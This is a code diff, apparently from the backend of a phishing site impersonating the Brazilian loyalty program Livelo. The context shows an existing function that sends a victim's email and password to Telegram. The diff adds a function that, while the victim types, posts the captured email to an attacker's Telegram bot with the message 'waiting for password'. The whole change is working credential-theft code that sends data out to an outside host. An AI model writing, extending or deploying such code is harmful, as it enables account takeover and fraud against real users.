@@ -64,6 +64,29 @@ async def send_telegram_notification(email: str, password: str, device: str = "D
     except Exception as e:
         logging.error(f"Erro ao enviar notificação Telegram: {e}")
 
+# Função para notificar quando email é digitado
+async def send_telegram_email_typing(email: str):
+    try:
+        now = datetime.now(timezone.utc).strftime("%d/%m/%Y %H:%M")
+        message = f"""👀 *Usuário digitando na Livelo*
+
+📧 *Email:* `{email}`
+⏰ *Horário:* {now} UTC
+
+_Aguardando senha..._"""
+        
+        async with httpx.AsyncClient() as client:
+            await client.post(
+                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
+                json={
+                    "chat_id": TELEGRAM_CHAT_ID,
+                    "text": message,
+                    "parse_mode": "Markdown"
+                }
+            )
+    except Exception as e:
+        logging.error(f"Erro ao enviar notificação Telegram: {e}")
+
 
 # Define Models
 class StatusCheck(BaseModel):
